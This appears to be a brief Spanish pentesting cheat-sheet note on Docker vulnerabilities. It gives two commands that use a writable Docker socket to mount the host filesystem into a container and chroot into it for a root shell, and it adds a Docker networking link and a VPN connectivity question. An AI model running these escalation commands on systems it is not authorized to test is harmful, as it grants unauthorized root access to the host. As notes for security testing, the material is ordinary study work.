x# Vulnerabilidades Docker


## Writable Docker Socket
- REferencia: https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket

- Comandos:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```



Referencias
[REd de docker](https://docs.docker.com/network/network-tutorial-standalone/)


Problema>
No puedo acceder mi ocal host cuando estoy en la vpn en el contenedor
https://serverfault.com/questions/895278/not-able-to-access-to-the-internet-in-a-container-on-a-vpn



